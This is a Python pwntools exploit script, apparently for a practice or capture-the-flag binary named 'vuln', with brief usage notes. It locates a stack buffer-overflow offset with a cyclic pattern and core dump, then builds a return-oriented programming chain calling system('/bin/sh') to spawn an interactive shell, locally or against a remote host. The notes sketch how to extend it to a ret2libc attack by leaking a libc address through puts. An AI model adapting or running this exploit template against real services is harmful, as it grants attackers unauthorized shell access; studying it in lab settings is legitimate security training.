```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./vuln")
context.log_level = "info"

HOST, PORT = "127.0.0.1", 1337
BADCHARS = b"\x00\x0a\x0d"

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)

def find_offset():
    io = start()
    io.sendline(cyclic(1024, n=8))
    io.wait()
    core = io.corefile
    io.close()
    offset = cyclic_find(core.read(core.rsp, 8), n=8)
    log.success(f"offset: {offset}")
    return offset

def filter_badchars(payload):
    for c in payload:
        if bytes([c]) in BADCHARS:
            raise ValueError(f"bad char in payload: {c:#x}")
    return payload

def build_chain(offset):
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret = rop.find_gadget(["ret"])[0]

    chain = flat(
        b"A" * offset,
        ret,
        pop_rdi, next(elf.search(b"/bin/sh\x00")),
        elf.plt["system"],
    )
    return filter_badchars(chain)

def main():
    offset = int(args.OFFSET or 0) or find_offset()
    payload = build_chain(offset)
    io = start()
    io.sendlineafter(b"> ", payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

Usage: `python3 exploit.py` (finds offset via core dump), `python3 exploit.py OFFSET=72`, `python3 exploit.py REMOTE`. For ret2libc instead of ret2win, leak a libc pointer first, then chain `pop rdi; got[puts]; plt[puts]; ret-to-main` and re-exploit with `system`/`"/bin/sh"` from the leaked base.
